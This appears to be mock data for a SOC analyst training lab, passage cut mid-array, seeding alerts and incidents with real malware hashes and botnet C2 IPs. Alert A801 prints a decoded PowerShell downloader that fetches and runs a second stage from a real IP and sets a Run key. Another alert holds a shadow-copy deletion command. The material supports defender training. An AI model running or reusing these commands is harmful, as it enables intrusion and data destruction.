// SC-200_lab mock data. Scenarios, users, and hostnames are fictional.
//
// INDICATORS ARE REAL. Every hash, IP, and JA3 below was pulled from a public
// source and verified on 2026-08-02 — see IOC_PROVENANCE for the per-indicator
// citation. They are inert strings: nothing in this lab resolves, fetches, or
// connects to any of them. They are real so that you can practise the actual
// analyst loop — paste an indicator into VirusTotal, MalwareBazaar, ThreatFox,
// or CIRCL hashlookup and get a genuine verdict back.
//
// Re-verify before trusting an enrichment result: feed listings age out, and an
// IP that is a live C2 today may be reassigned to something innocent later.

// --- File hashes -----------------------------------------------------------
// Known-good pair: Nmap's own vendor-published installer digests. Defender
// genuinely detects Nmap as HackTool:Win32/Nmap, which is why a SOC would
// suppress it. 7.98 -> 7.99 is a REAL hash drift across a vendor update, and it
// is the whole point of the A001-A005 lesson: a rule pinned to a SHA256 breaks
// the moment the vendor ships a new build.
const KNOWN_GOOD_HASH  = '5a52826b45600c34662012cc70f35df8dde590b83c14d0f3c7be04bbb4087d32'; // nmap-7.98-setup.exe
const POST_UPDATE_HASH = 'fda839f35d9f8f18a11670e17d0332ce9d05a3556c5a20e91b0b56c57774f611'; // nmap-7.99-setup.exe

// Confirmed-malicious. WannaCry dropper, planted under a trusted tool's file
// name to illustrate masquerading (T1036.005). Verified KnownMalicious.
const ROGUE_HASH       = '24d004a104d4d54034dbcffc2a4b19a11f39008a575aa614ea04703480b1022c';

// WannaCry encryptor — the canonical 2017 sample (MD5 84c82835a5d21bbcf75a...).
// Pairs with ROGUE_HASH: dropper on WKS-03, encryptor on the file server.
const RANSOMWARE_HASH  = 'ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa';

// EICAR anti-malware test file. Harmless by design, universally detected, and
// reproducible: printf 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
const EICAR_HASH       = '275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f';

// --- Network indicators ----------------------------------------------------
const TOR_EXIT_IP      = '185.220.101.44';  // real Tor exit relay (netname TOR-EXIT)
const QAKBOT_C2_IP     = '50.16.16.211';    // Feodo Tracker: QakBot C2, port 443
const EMOTET_C2_IP     = '162.243.103.246'; // Feodo Tracker: Emotet C2, port 8080

// Where each indicator came from, so a verdict can be re-checked rather than
// taken on faith. Rendered in the alert detail pane.
const IOC_PROVENANCE = {
  [KNOWN_GOOD_HASH]:  { verdict:'Known good (vendor-signed)', source:'nmap.org/dist/sigs/nmap-7.98-setup.exe.digest.txt', note:'Publisher-published digest for Nmap 7.98.' },
  [POST_UPDATE_HASH]: { verdict:'Known good (vendor-signed)', source:'nmap.org/dist/sigs/nmap-7.99-setup.exe.digest.txt', note:'Same product, next release. Hash differs — this is the drift.' },
  [ROGUE_HASH]:       { verdict:'Malicious', source:'CIRCL hashlookup -> KnownMalicious (malshare.com)', note:'WannaCry dropper. Real sample; renamed here to show masquerading.' },
  [RANSOMWARE_HASH]:  { verdict:'Malicious', source:'CIRCL hashlookup -> KnownMalicious (malshare.com)', note:'WannaCry encryptor, MD5 84c82835a5d21bbcf75a61706d8ab549.' },
  [EICAR_HASH]:       { verdict:'Malicious (test file)', source:'CIRCL hashlookup -> FileName eicar.com, 68 bytes', note:'Not malware. Standard AV test string — safe to reproduce yourself.' },
  [TOR_EXIT_IP]:      { verdict:'Anonymising infrastructure', source:'RIPE whois -> netname TOR-EXIT', note:'Tor exit relay. Suspicious as a destination, not proof of compromise.' },
  [QAKBOT_C2_IP]:     { verdict:'Malicious (botnet C2)', source:'Feodo Tracker ipblocklist -> QakBot', note:'Listed as QakBot C2 on 443. Hosted on cloud IP space.' },
  [EMOTET_C2_IP]:     { verdict:'Malicious (botnet C2)', source:'Feodo Tracker ipblocklist -> Emotet', note:'Listed as Emotet C2 on 8080.' },
};

const SEED_ALERTS = [
  { id:'A001', severity:'medium', title:'Suspicious activity by vulnerability scanner',
    status:'New', category:'Discovery', detectionSource:'EDR', asset:'WKS-01',
    firstActivity:'2026-06-28T09:00:00Z', incidentId:'INC-1024',
    event:{ file_name:'scanner.exe', sha256:KNOWN_GOOD_HASH,
            path:'C:\\Tools\\Scanner\\scanner.exe', signer:'Acme Security Inc.',
            cmdline:'scanner.exe --scan C:\\' },
    note:'Pre-update: name + hash match the suppression rule.' },
  { id:'A002', severity:'medium', title:'Suspicious activity by vulnerability scanner',
    status:'New', category:'Discovery', detectionSource:'EDR', asset:'WKS-02',
    firstActivity:'2026-06-28T09:05:00Z', incidentId:'INC-1024',
    event:{ file_name:'scanner.exe', sha256:KNOWN_GOOD_HASH,
            path:'C:\\Tools\\Scanner\\scanner.exe', signer:'Acme Security Inc.',
            cmdline:'scanner.exe --scan D:\\' } },
  { id:'A003', severity:'medium', title:'Suspicious activity by vulnerability scanner',
    status:'New', category:'Discovery', detectionSource:'EDR', asset:'WKS-01',
    firstActivity:'2026-06-28T14:00:00Z', incidentId:'INC-1031',
    event:{ file_name:'scanner.exe', sha256:POST_UPDATE_HASH,
            path:'C:\\Tools\\Scanner\\scanner.exe', signer:'Acme Security Inc.',
            cmdline:'scanner.exe --scan C:\\' },
    note:'Post-update: vendor patched the binary — SHA256 drifted, rule no longer matches.' },
  { id:'A004', severity:'medium', title:'Suspicious activity by vulnerability scanner',
    status:'New', category:'Discovery', detectionSource:'EDR', asset:'WKS-02',
    firstActivity:'2026-06-28T14:15:00Z', incidentId:'INC-1031',
    event:{ file_name:'scanner.exe', sha256:POST_UPDATE_HASH,
            path:'C:\\Tools\\Scanner\\scanner.exe', signer:'Acme Security Inc.',
            cmdline:'scanner.exe --scan D:\\' } },
  { id:'A005', severity:'high', title:'Suspicious file mimicking known scanner',
    status:'New', category:'Defense evasion', detectionSource:'EDR', asset:'WKS-03',
    firstActivity:'2026-06-28T15:00:00Z', incidentId:'INC-1038',
    event:{ file_name:'scanner.exe', sha256:ROGUE_HASH,
            path:'C:\\Users\\Public\\scanner.exe', signer:'(unsigned)', cmdline:'scanner.exe' },
    note:'Look-alike file name only — different hash. Demonstrates why file-name-only suppression is unsafe.' },
  { id:'A101', severity:'high', title:'Possible AdminSDHolder modification',
    status:'In progress', category:'Persistence', detectionSource:'MDI', asset:'DC01',
    firstActivity:'2026-06-28T03:42:00Z', incidentId:'INC-1019',
    event:{ user:'svc-backup', target:'CN=AdminSDHolder,CN=System,DC=example,DC=org' } },
  { id:'A102', severity:'high', title:'Suspected DCSync attack (replication of directory services)',
    status:'In progress', category:'Credential access', detectionSource:'MDI', asset:'DC01',
    firstActivity:'2026-06-28T03:44:00Z', incidentId:'INC-1019',
    event:{ user:'svc-backup', source_ip:'10.20.4.55', target:'DC01.hacksmarterlabs.example' } },
  { id:'A201', severity:'high', title:'User compromised through phishing email with malicious URL',
    status:'New', category:'Initial access', detectionSource:'MDO', asset:'jane.doe@hacksmarterlabs.example',
    firstActivity:'2026-06-28T08:11:00Z', incidentId:'INC-1042',
    event:{ url:'https://secure-document-portal[.]xyz/login', subject:'Action required: invoice overdue' } },
  { id:'A202', severity:'medium', title:'Anomalous OAuth consent grant',
    status:'New', category:'Initial access', detectionSource:'MDA', asset:'jane.doe@hacksmarterlabs.example',
    firstActivity:'2026-06-28T08:23:00Z', incidentId:'INC-1042',
    event:{ app_name:'DocViewer Pro', permissions:'Mail.ReadWrite, Files.Read.All' } },
  { id:'A301', severity:'high', title:'Multiple endpoints encrypted by suspected ransomware',
    status:'New', category:'Impact', detectionSource:'MDE', asset:'FIN-FS-02',
    firstActivity:'2026-06-28T10:18:00Z', incidentId:'INC-1050',
    event:{ file_name:'locker.exe', sha256:'7a64529e93fa01e8cedfc02114f397d4bbbb42715349f24763d3b7765ffed466',
            path:'C:\\ProgramData\\locker.exe', ransom_note:'RECOVER-FILES.txt' } },
  { id:'A302', severity:'high', title:'Shadow copy deletion followed by mass file rename',
    status:'New', category:'Impact', detectionSource:'MDE', asset:'FIN-FS-02',
    firstActivity:'2026-06-28T10:20:00Z', incidentId:'INC-1050',
    event:{ process:'vssadmin.exe', cmdline:'vssadmin delete shadows /all /quiet', extension:'.locked' } },
  { id:'A401', severity:'high', title:'Adversary-in-the-middle phishing session detected',
    status:'New', category:'Initial access', detectionSource:'Entra ID Protection', asset:'maria.ross@hacksmarterlabs.example',
    firstActivity:'2026-06-28T06:40:00Z', incidentId:'INC-1051',
    event:{ user:'maria.ross@hacksmarterlabs.example', source_ip:'185.199.111.12', sign_in_risk:'High', mfa_method:'Push' } },
  { id:'A501', severity:'high', title:'Container escaped to host namespace',
    status:'In progress', category:'Privilege escalation', detectionSource:'Defender for Containers', asset:'aks-prod/node-3',
    firstActivity:'2026-06-28T12:01:00Z', incidentId:'INC-1052',
    event:{ cluster:'aks-prod', pod:'pod-api-77', image:'hacksmarterlabs/api:2026.06', syscall:'setns' } },
  { id:'A601', severity:'medium', title:'Risky sign-in from unfamiliar location',
    status:'New', category:'Credential access', detectionSource:'Entra ID Protection', asset:'sam.lee@hacksmarterlabs.example',
    firstActivity:'2026-06-28T13:27:00Z', incidentId:'INC-1053',
    event:{ user:'sam.lee@hacksmarterlabs.example', source_ip:'91.219.236.54', country:'NL', risk_level:'High' } },
  { id:'A701', severity:'high', title:'Cloud storage container publicly exposed',
    status:'New', category:'Exfiltration', detectionSource:'Defender for Cloud', asset:'aws-s3-prod-logs',
    firstActivity:'2026-06-28T07:52:00Z', incidentId:'INC-1054',
    event:{ account:'aws-prod', bucket:'aws-s3-prod-logs', acl:'public-read', finding:'External principals can list objects' } },
  { id:'A801', severity:'high', title:'A suspicious PowerShell command line was run',
    status:'New', category:'Execution', detectionSource:'MDE', asset:'FIN-WKS-07',
    firstActivity:'2026-06-28T16:20:00Z', incidentId:'INC-1055',
    event:{ file_name:'invoice_update.ps1', initiating_process:'winword.exe',
            cmdline:'powershell.exe -nop -w hidden -EncodedCommand JABjAD0ATgBlAHcA...(truncated)',
            user:'example\\j.reyes', device:'FIN-WKS-07' },
    note:'This is the script-triggered incident. Open the alert, then use "Analyze script" to reach the embedded script analysis and Show MITRE techniques.',
    scriptAnalysis:{
      fileName:'invoice_update.ps1',
      spawnedBy:'winword.exe',
      verdict:'Malicious',
      summary:'Automated script analysis decoded the Base64 -EncodedCommand payload and flagged it as malicious.',
      decoded:[
        '$c = New-Object Net.WebClient',
        "$c.Headers.Add('User-Agent','Mozilla/5.0')",
        "$p = $c.DownloadString('http://185.220.101.44/a/stage2.ps1')",
        'Invoke-Expression $p',
        "Set-ItemProperty 'HKCU:\\...\\Run' Updater 'powershell -w hidden -enc <b64>'",
      ],
      findings:[
        'Runs with -EncodedCommand and -w hidden to obscure intent.',
        'Downloads and executes a second-stage payload from a remote host (185.220.101.44).',
        'Uses Invoke-Expression to run downloaded code in memory.',
        'Writes an HKCU ...\\Run registry value to persist across reboots.',
      ],
      // Grouped by ATT&CK tactic; revealed by the "Show MITRE techniques" control.
      techniques:[
        { tactic:'Execution', id:'T1059.001', name:'Command and Scripting Interpreter: PowerShell',
          detail:'Encoded PowerShell command spawned from winword.exe.' },
        { tactic:'Defense Evasion', id:'T1027', name:'Obfuscated Files or Information',
          detail:'Base64 -EncodedCommand payload and a hidden window (-w hidden).' },
        { tactic:'Defense Evasion', id:'T1140', name:'Deobfuscate/Decode Files or Information',
          detail:'Decodes the encoded command at runtime before execution.' },
        { tactic:'Command and Control', id:'T1105', name:'Ingress Tool Transfer',
          detail:'Downloads stage2.ps1 from a remote host.' },
        { tactic:'Command and Control', id:'T1071.001', name:'Application Layer Protocol: Web Protocols',
          detail:'HTTP retrieval with a spoofed User-Agent string.' },
        { tactic:'Persistence', id:'T1547.001', name:'Registry Run Keys / Startup Folder',
          detail:'Adds an HKCU ...\\Run value to relaunch at logon.' },
      ],
    } },
  { id:'A901', severity:'low', title:'Password spray attempt blocked by identity protection',
    status:'New', category:'Credential access', detectionSource:'Entra ID Protection', asset:'liam.chen@hacksmarterlabs.example',
    firstActivity:'2026-06-28T16:34:00Z', incidentId:'INC-1060',
    event:{ user:'liam.chen@hacksmarterlabs.example', source_ip:'203.0.113.74', attempts:8,
            result:'Blocked by smart lockout', risk_level:'Low' },
    note:'The sign-in was blocked, but the source and targeted account still warrant quick scoping.' },
  { id:'A1001', severity:'low', title:'Potentially unwanted application was quarantined',
    status:'In progress', category:'Execution', detectionSource:'MDE', asset:'HR-WKS-04',
    firstActivity:'2026-06-28T16:46:00Z', incidentId:'INC-1061',
    event:{ file_name:'coupon-helper.exe', sha256:'c98e7f6f190c5722277ebd650852486d81087aebf779b09b2411c882db318413',
            path:'C:\\Users\\Public\\Downloads\\coupon-helper.exe', action:'Quarantined' } },
  { id:'A1101', severity:'low', title:'External mailbox forwarding rule detected and disabled',
    status:'New', category:'Persistence', detectionSource:'MDO', asset:'nina.patel@hacksmarterlabs.example',
    firstActivity:'2026-06-28T17:02:00Z', incidentId:'INC-1062',
    event:{ user:'nina.patel@hacksmarterlabs.example', rule_name:'Forward invoices', destination:'archive-mail@external.example',
            action:'Rule disabled automatically' } },
  { id:'A1201', severity:'low', title:'Repeated anonymous storage probes were denied',
    status:'New', category:'Discovery', detectionSource:'Defender for Cloud', asset:'stfinancearchive',
    firstActivity:'2026-06-28T17:18:00Z', incidentId:'INC-1063',
    event:{ storage_account:'stfinancearchive', source_ip:'198.51.100.62', requests:19,
            result:'Denied by private endpoint policy' } },
  { id:'A1301', severity:'informational', title:'Safe Links blocked a phishing URL before user access',
    status:'Resolved', category:'Initial access', detectionSource:'MDO', asset:'evan.brooks@hacksmarterlabs.example',
    firstActivity:'2026-06-28T17:31:00Z', incidentId:'INC-1064',
    event:{ user:'evan.brooks@hacksmarterlabs.example', subject:'Updated payroll calendar',
            url:'https://payroll-calendar[.]example/signin', action:'Blocked before click-through' } },
  { id:'A1401', severity:'informational', title:'Privileged role activation matched approved PIM request',
    status:'Resolved', category:'Privilege escalation', detectionSource:'Entra ID Protection', asset:'olivia.kim@hacksmarterlabs.example',
    firstActivity:'2026-06-28T17:44:00Z', incidentId:'INC-1065',
    event:{ user:'olivia.kim@hacksmarterlabs.example', role:'Security Administrator', duration:'45 minutes',
            approval:'CHG-4821 / approved' } },
  { id:'A1501', severity:'informational', title:'OAuth consent granted to verified publisher application',
    status:'New', category:'Persistence', detectionSource:'MDA', asset:'jordan.wong@hacksmarterlabs.example',
    firstActivity:'2026-06-28T17:56:00Z', incidentId:'INC-1066',
    event:{ user:'jordan.wong@hacksmarterlabs.example', app_name:'Hack Smarter Travel', publisher:'Verified',
            permissions:'User.Read, Calendars.Read', consent_policy:'Allowed' } },
  { id:'A1601', severity:'informational', title:'Office child process observed in ASR audit mode',
    status:'New', category:'Execution', detectionSource:'MDE', asset:'MKT-WKS-11',
    firstActivity:'2026-06-28T18:09:00Z', incidentId:'INC-1067',
    event:{ parent_process:'winword.exe', process:'cmd.exe', document:'Q3-campaign-template.docm',
            asr_mode:'Audit', signer:'Hack Smarter Marketing Automation' } },
  // Module 01's teaching case. The portal lab presents this same account and
  // timeline as a plain alert card; here it is the SIEM record behind it, so a
  // first-time student sees that both halves describe one event.
  { id:'A1701', severity:'medium', title:'Successful sign-in after repeated failures',
    status:'New', category:'Credential access', detectionSource:'Identity Protection', asset:'j.santos@hacksmarterlabs.example',
    firstActivity:'2026-06-28T09:09:41Z', incidentId:'INC-1070',
    event:{ user:'j.santos@hacksmarterlabs.example', source_ip:'185.220.101.24', country:'RO',
            failed_attempts:8, first_failure:'2026-06-28T09:02:11Z', succeeded_at:'2026-06-28T09:09:41Z',
            client_app:'Browser (unmanaged)', risk_level:'High' } },
];

const INCIDENTS = [
  { id:'INC-1019', severity:'high', title:'Suspected identity attack on domain controller',
    status:'In progress', assignedTo:'Me', classification:'',
    tactics:['Credential Access','Persistence'], alertIds:['A101','A102'],
    entities:[{type:'User',name:'svc-backup'},{type:'Device',name:'DC01'},{type:'IP',name:'10.20.4.55'}],
    createdAt:'2026-06-28T03:45:00Z', alertCount:2,
    summary:'Service account performed directory replication followed by AdminSDHolder access — classic DCSync + persistence pattern.' },
  { id:'INC-1024', severity:'medium', title:'Multi-stage scanner activity across endpoints',
    status:'New', assignedTo:'Unassigned', classification:'',
    tactics:['Discovery'], alertIds:['A001','A002'],
    entities:[{type:'File',name:'scanner.exe'},{type:'Device',name:'WKS-01'},{type:'Device',name:'WKS-02'}],
    createdAt:'2026-06-28T09:00:00Z', alertCount:2,
    summary:'Two endpoints ran the same vulnerability scanner. Pre-update hash matches the legitimate-tool suppression rule.' },
  { id:'INC-1031', severity:'medium', title:'Scanner activity (post-vendor update)',
    status:'New', assignedTo:'Unassigned', classification:'',
    tactics:['Discovery'], alertIds:['A003','A004'],
    entities:[{type:'File',name:'scanner.exe'},{type:'Device',name:'WKS-01'},{type:'Device',name:'WKS-02'}],
    createdAt:'2026-06-28T14:00:00Z', alertCount:2,
    summary:'Same scanner, new SHA256 after vendor update. Suppression rule pinned to old hash no longer matches.' },
  { id:'INC-1038', severity:'high', title:'Unsigned binary masquerading as scanner.exe',
    status:'New', assignedTo:'Unassigned', classification:'',
    tactics:['Defense Evasion','Discovery'], alertIds:['A005'],
    entities:[{type:'File',name:'scanner.exe'},{type:'Device',name:'WKS-03'}],
    createdAt:'2026-06-28T15:00:00Z', alertCount:1,
    summary:'File named scanner.exe in C:\\Users\\Public — unsigned, completely different hash. Real threat actor pattern.' },
  { id:'INC-1042', severity:'high', title:'Phishing leading to OAuth consent abuse',
    status:'New', assignedTo:'Me', classification:'',
    tactics:['Initial Access','Persistence'], alertIds:['A201','A202'],
    entities:[{type:'User',name:'jane.doe@hacksmarterlabs.example'},{type:'URL',name:'secure-document-portal[.]xyz'},{type:'App',name:'DocViewer Pro'}],
    createdAt:'2026-06-28T08:11:00Z', alertCount:2,
    summary:'User clicked phishing link, then granted a third-party OAuth app Mail.ReadWrite. Likely token-theft persistence.' },
  { id:'INC-1050', severity:'high', title:'Ransomware activity on finance file server',
    status:'New', assignedTo:'Unassigned', classification:'',
    responseTag:'Attack disruption',
    tactics:['Impact','Defense Evasion'], alertIds:['A301','A302'],
    entities:[{type:'Device',name:'FIN-FS-02'},{type:'File',name:'locker.exe'},{type:'Process',name:'vssadmin.exe'}],
    disruptionActions:[
      { time:'2026-06-28T10:18:36Z', action:'Contain user', target:'fin-svc@hacksmarterlabs.example',
        result:'Automated action blocked token reuse and prevented new remote sessions.' },
      { time:'2026-06-28T10:18:48Z', action:'Contain device', target:'FIN-FS-02',
        result:'Device isolated from peer endpoints while preserving Defender service connectivity.' },
      { time:'2026-06-28T10:19:06Z', action:'Stop process tree', target:'locker.exe',
        result:'Malicious encryption process tree terminated before additional shares were touched.' },
    ],
    createdAt:'2026-06-28T10:21:00Z', alertCount:2,
    summary:'Encryption behavior, ransom-note creation, and shadow-copy deletion indicate active ransomware on a file server.' },
  { id:'INC-1051', severity:'high', title:'AiTM phishing against finance user',
    status:'New', assignedTo:'L1-Triage', classification:'',
    tactics:['Initial Access','Credential Access'], alertIds:['A401'],
    entities:[{type:'User',name:'maria.ross@hacksmarterlabs.example'},{type:'IP',name:'185.199.111.12'},{type:'Session',name:'MFA proxied sign-in'}],
    createdAt:'2026-06-28T06:41:00Z', alertCount:1,
    summary:'High-risk sign-in used a valid MFA response through a suspected AiTM phishing proxy. Revoke sessions and require phishing-resistant MFA.' },
  { id:'INC-1052', severity:'high', title:'Possible container breakout in AKS production',
    status:'In progress', assignedTo:'cloud-sec', classification:'',
    tactics:['Privilege Escalation','Defense Evasion'], alertIds:['A501'],
    entities:[{type:'Cluster',name:'aks-prod'},{type:'Container',name:'pod-api-77'},{type:'Device',name:'aks-prod/node-3'}],
    createdAt:'2026-06-28T12:03:00Z', alertCount:1,
    summary:'Container attempted namespace manipulation on the node. Isolate workload, collect image evidence, and rotate cluster credentials.' },
  { id:'INC-1053', severity:'medium', title:'AAD risky sign-in for sales user',
    status:'New', assignedTo:'Unassigned', classification:'',
    tactics:['Credential Access','Initial Access'], alertIds:['A601'],
    entities:[{type:'User',name:'sam.lee@hacksmarterlabs.example'},{type:'IP',name:'91.219.236.54'}],
    createdAt:'2026-06-28T13:28:00Z', alertCount:1,
    summary:'Identity Protection raised a high-risk sign-in from an unfamiliar location. Confirm user activity and reset credentials if suspicious.' },
  { id:'INC-1054', severity:'high', title:'S3-style cloud storage misconfiguration',
    status:'New', assignedTo:'cloud-sec', classification:'',
    tactics:['Exfiltration','Discovery'], alertIds:['A701'],
    entities:[{type:'Storage',name:'aws-s3-prod-logs'},{type:'Cloud account',name:'aws-prod'}],
    createdAt:'2026-06-28T07:53:00Z', alertCount:1,
    summary:'Public-read ACL on a log bucket exposes production telemetry. Remove public access, review object access, and add guardrail policy.' },
  { id:'INC-1055', severity:'high', title:'Suspicious PowerShell script execution on FIN-WKS-07',
    status:'New', assignedTo:'Unassigned', classification:'',
    tactics:['Execution','Defense Evasion','Command and Control','Persistence'], alertIds:['A801'],
    entities:[{type:'Device',name:'FIN-WKS-07'},{type:'User',name:'j.reyes@hacksmarterlabs.example'},{type:'File',name:'invoice_update.ps1'}],
    createdAt:'2026-06-28T16:21:00Z', alertCount:1,
    summary:'An encoded PowerShell script spawned by Word downloaded a second-stage payload and set a Run key. Open the alert to analyze the script and view its MITRE ATT&CK techniques.' },
  { id:'INC-1060', severity:'low', title:'Blocked password spray against single user',
    status:'New', assignedTo:'L1-Triage', classification:'',
    tactics:['Credential Access'], alertIds:['A901'],
    entities:[{type:'User',name:'liam.chen@hacksmarterlabs.example'},{type:'IP',name:'203.0.113.74'}],
    createdAt:'2026-06-28T16:35:00Z', alertCount:1,
    summary:'Smart lockout blocked a small password-spray burst. Check whether the source targeted other users, then close as prevented if no successful sign-in exists.' },
  { id:'INC-1061', severity:'low', title:'Potentially unwanted application on HR workstation',
    status:'In progress', assignedTo:'endpoint-queue', classification:'',
    tactics:['Execution'], alertIds:['A1001'],
    entities:[{type:'Device',name:'HR-WKS-04'},{type:'File',name:'coupon-helper.exe'}],
    createdAt:'2026-06-28T16:47:00Z', alertCount:1,
    summary:'Defender quarantined a bundled browser helper. Validate the download source and confirm that no related persistence or credential access followed.' },
  { id:'INC-1062', severity:'low', title:'Suspicious external mailbox forwarding rule',
    status:'New', assignedTo:'messaging-sec', classification:'',
    tactics:['Persistence','Collection'], alertIds:['A1101'],
    entities:[{type:'User',name:'nina.patel@hacksmarterlabs.example'},{type:'Mailbox rule',name:'Forward invoices'},{type:'Email',name:'archive-mail@external.example'}],
    createdAt:'2026-06-28T17:03:00Z', alertCount:1,
    summary:'An external forwarding rule was disabled automatically. Confirm whether the user created it and review recent sign-ins and mailbox activity before closure.' },
  { id:'INC-1063', severity:'low', title:'Denied anonymous probes against finance storage',
    status:'New', assignedTo:'cloud-sec', classification:'',
    tactics:['Discovery'], alertIds:['A1201'],
    entities:[{type:'Storage',name:'stfinancearchive'},{type:'IP',name:'198.51.100.62'}],
    createdAt:'2026-06-28T17:19:00Z', alertCount:1,
    summary:'A public source repeatedly tested a private storage endpoint and received only denied responses. Validate policy coverage and search for the source across other cloud assets.' },
  { id:'INC-1064', severity:'informational', title:'Phishing URL blocked before user access',
    status:'Resolved', assignedTo:'MDO-Automation', classification:'Benign positive',
    tactics:['Initial Access'], alertIds:['A1301'],
    entities:[{type:'User',name:'evan.brooks@hacksmarterlabs.example'},{type:'URL',name:'payroll-calendar[.]example'}],
    createdAt:'2026-06-28T17:32:00Z', alertCount:1,
    summary:'Safe Links blocked the destination before the user could open it. The incident preserves the prevention evidence for campaign scoping and reporting.' },
  { id:'INC-1065', severity:'informational', title:'Approved privileged role activation',
    status:'Resolved', assignedTo:'identity-automation', classification:'Expected activity',
    tactics:['Privilege Escalation'], alertIds:['A1401'],
    entities:[{type:'User',name:'olivia.kim@hacksmarterlabs.example'},{type:'Role',name:'Security Administrator'},{type:'Change',name:'CHG-4821'}],
    createdAt:'2026-06-28T17:45:00Z', alertCount:1,
    summary:'A time-bound privileged role activation matched its approved change request. Retain the record as an informational audit trail.' },
  { id:'INC-1066', severity:'informational', title:'Verified publisher OAuth consent review',
    status:'New', assignedTo:'Unassigned', classification:'',
    tactics:['Persistence'], alertIds:['A1501'],
    entities:[{type:'User',name:'jordan.wong@hacksmarterlabs.example'},{type:'App',name:'Hack Smarter Travel'}],
    createdAt:'2026-06-28T17:57:00Z', alertCount:1,
    summary:'A user granted low-impact delegated permissions to a verified application under the tenant consent policy. Confirm business need and publisher identity.' },
  { id:'INC-1067', severity:'informational', title:'Office child process recorded in ASR audit mode',
    status:'New', assignedTo:'detection-eng', classification:'',
    tactics:['Execution'], alertIds:['A1601'],
    entities:[{type:'Device',name:'MKT-WKS-11'},{type:'Process',name:'cmd.exe'},{type:'File',name:'Q3-campaign-template.docm'}],
    createdAt:'2026-06-28T18:10:00Z', alertCount:1,
    summary:'An Office child-process event was logged by an ASR rule in audit mode. Validate the signed marketing automation before deciding whether the rule can move to block mode.' },
  { id:'INC-1070', severity:'medium', title:'Successful sign-in after repeated failures',
    status:'New', assignedTo:'L1-Triage', classification:'',
    tactics:['Credential Access'], alertIds:['A1701'],
    entities:[{type:'User',name:'j.santos@hacksmarterlabs.example'},{type:'IP',name:'185.220.101.24'},{type:'Session',name:'Unmanaged browser session'}],
    createdAt:'2026-06-28T09:10:00Z', alertCount:1,
    summary:'Eight password failures were followed by one success for the same account, from an IP and browser the account has never used. Service desk reached the account owner on the registered phone number at 09:14 — the user confirms they did not attempt these sign-ins and was not travelling.' },
];

const MDE_SETTINGS = {
  advancedFeatures:[
    { name:'EDR in block mode', enabled:true, note:'Blocks malicious artifacts after EDR conviction even when another antivirus is primary.' },
    { name:'Live response', enabled:true, note:'Allows approved responders to open device sessions for investigation commands.' },
    { name:'Automated investigation', enabled:true, note:'Lets AIR collect evidence and remediate low-risk findings automatically.' },
    { name:'Custom network indicators', enabled:true, note:'Applies tenant IP/domain allow and block indicators to onboarded endpoints.' },
    { name:'Preview features', enabled:false, note:'Kept off in this lab tenant until SOC leads approve pilot devices.' },
  ],
  rulesSettings:[
    { area:'Alert suppression', setting:'Enabled with expiration review', owner:'SOC engineering' },
    { area:'Indicators', setting:'File, certificate, IP, URL, and domain indicators allowed', owner:'Threat intel' },
    { area:'Endpoint notifications', setting:'User notifications on block actions', owner:'Endpoint platform' },
    { area:'Advanced hunting', setting:'Custom detections can trigger device and file actions', owner:'Detection engineering' },
  ],
  customCollection:[
    { name:'Browser extension inventory', scope:'Pilot devices', table:'DeviceTvmBrowserExtensions', status:'Collecting' },
    { name:'Finance app plugin audit', scope:'Finance device group', table:'DeviceFileEvents', status:'Planned' },
    { name:'High-value server script logs', scope:'Tier 0 servers', table:'DeviceEvents', status:'Collecting' },
  ],
  deviceGroups:[
    { name:'Tier 0 servers', devices:14, automation:'Semi - require approval', role:'Privileged responders', rank:1 },
    { name:'Finance workstations', devices:128, automation:'Full - remediate threats', role:'SOC analysts', rank:2 },
    { name:'Pilot endpoints', devices:32, automation:'Full - preview features', role:'Endpoint engineering', rank:3 },
    { name:'Default', devices:842, automation:'Semi - remediate safe actions', role:'Security readers', rank:4 },
  ],
  roles:[
    { role:'Security administrator', members:'4 users', rights:'Manage settings, device groups, indicators, and roles' },
    { role:'Security operator', members:'12 users', rights:'Investigate alerts, run response actions, approve AIR actions' },
    { role:'Security reader', members:'26 users', rights:'Read-only investigation and reporting access' },
    { role:'Live response operator', members:'5 users', rights:'Run approved live response commands on scoped devices' },
  ],
};

const ASR_POLICIES = [
  { rule:'Block Office from creating child processes', state:'Block', mode:'Enforced', exclusions:['finance-macro-runner.exe'], impact:'3 blocks / 24h' },
  { rule:'Block executable content from email and webmail', state:'Block', mode:'Enforced', exclusions:[], impact:'11 blocks / 24h' },
  { rule:'Block credential stealing from LSASS', state:'Block', mode:'Enforced', exclusions:['edr-sensor-test.exe'], impact:'1 block / 7d' },
  { rule:'Use advanced protection against ransomware', state:'Audit', mode:'Pilot', exclusions:['backup-agent.exe'], impact:'7 audits / 24h' },
  { rule:'Block JavaScript or VBScript from launching downloaded executables', state:'Warn', mode:'User override logged', exclusions:[], impact:'2 warns / 24h' },
  { rule:'Block abuse of vulnerable signed drivers', state:'Block', mode:'Enforced', exclusions:[], impact:'0 blocks / 24h' },
];

const NOTIFICATION_RULES = [
  { name:'High severity incidents', trigger:'Incident created or updated', recipients:'soc-leads@hacksmarterlabs.example', filter:'Severity is High', status:'Enabled' },
  { name:'Pending action approvals', trigger:'Action center item pending', recipients:'endpoint-response@hacksmarterlabs.example', filter:'Action requires approval', status:'Enabled' },
  { name:'Threat analytics exposure', trigger:'Threat analytics report impacts assets', recipients:'threat-intel@hacksmarterlabs.example', filter:'Impacted assets > 0', status:'Enabled' },
];

const ALERT_TUNING_RULES = [
  { name:'Merge scanner waves by device group', type:'Correlation hint', status:'Enabled', condition:'Same title + signer within 2 hours', outcome:'Rolls A001/A002 into scanner incident' },
  { name:'Do not correlate storage posture alerts with endpoint malware', type:'Correlation boundary', status:'Enabled', condition:'Service source differs and no shared entity', outcome:'Keeps cloud posture noise out of ransomware cases' },
  { name:'Escalate OAuth consent after phishing click', type:'Incident severity rule', status:'Enabled', condition:'MDO URL click followed by risky OAuth app', outcome:'Raises INC-1042 to High' },
  { name:'Scanner.exe hash drift review', type:'Tuning rule draft', status:'Draft', condition:'Signed Acme scanner from approved path', outcome:'Candidate for stable suppression or allow indicator' },
];

const AIR_INVESTIGATIONS = [
  { id:'AIR-7101', incident:'INC-1050', title:'Ransomware containment on FIN-FS-02', status:'Completed', verdict:'Malicious', actions:['Isolated FIN-FS-02','Quarantined locker.exe','Stopped process tree'], disruption:true },
